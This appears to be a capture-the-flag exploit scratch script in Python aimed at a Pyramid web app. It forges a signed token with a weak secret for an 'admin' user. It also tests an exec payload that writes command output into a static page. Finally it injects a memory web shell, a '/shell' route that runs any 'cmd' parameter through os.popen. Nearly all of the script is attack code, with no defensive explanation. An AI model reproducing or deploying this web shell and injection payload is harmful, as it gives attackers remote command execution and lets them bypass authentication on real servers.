"""
        if len(all_data) == 4: # self-defined key
            key_bytes = all_data[3].replace(' ', '+').encode('utf-8')
            key = base64.b64decode(key_bytes)  # bytes
"""
import hashlib
import json
token = "eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMifQ==.MzA5NmZkYzE4MmI2NmExYmRjZThhZmNmMWFjNzc2ZGVmOTFlOTdhMTc0YTE2NTA0MTRhNzU1NDc4NzZlYjAzYw==.SFM=.MTIzNDU2" # 123456
secret = b"123456"
data = '{"username":"admin","password":"123"}'
json_data = json.loads(data)
data_bytes = (json.dumps(json_data) + secret.decode()).encode('utf-8')
print(data_bytes)
hash_object = hashlib.sha256()
hash_object.update(data_bytes)
print(hash_object.hexdigest())
print("==================")
code = "__import__('os').system('ls >>../Match/static/register.html')"
# print(exec(code))
# +++++++++++++++++++++++++
from wsgiref.simple_server import make_server
from pyramid.config import Configurator
from pyramid.events import NewResponse
from pyramid.response import Response
code = "1"
print(exec(code))
"""
1. add_route
2. add_view (use lamda to create a function)

The question is that:
how to get `config`???
"""

config = Configurator()
print(globals()['config'])
globals()['config'].add_route("shell","/shell")
globals()['config'].add_view(lambda request: Response(__import__('os').popen(request.params['cmd']).read()),route_name = "shell")
globals()['config'].commit()